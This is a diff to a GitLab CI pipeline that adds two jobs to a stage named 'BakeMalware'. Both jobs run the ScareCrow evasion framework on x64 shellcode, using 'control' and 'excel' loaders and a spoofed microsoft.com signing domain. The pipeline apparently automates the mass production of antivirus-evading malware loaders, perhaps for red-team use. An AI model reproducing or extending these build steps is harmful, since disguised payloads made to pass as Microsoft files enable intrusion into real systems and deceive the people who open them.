@@ -35,6 +35,24 @@ ScareCrow02:
             cd /payloads/${CI_COMMIT_SHORT_SHA}
             ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader binary -domain microsoft.com
 
+ScareCrow03:
+    stage: BakeMalware
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader control -domain microsoft.com
+
+ScareCrow04:
+    stage: BakeMalware
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader excel -domain microsoft.com
+
 PostProcess:
     stage: PostProcess
     tags:
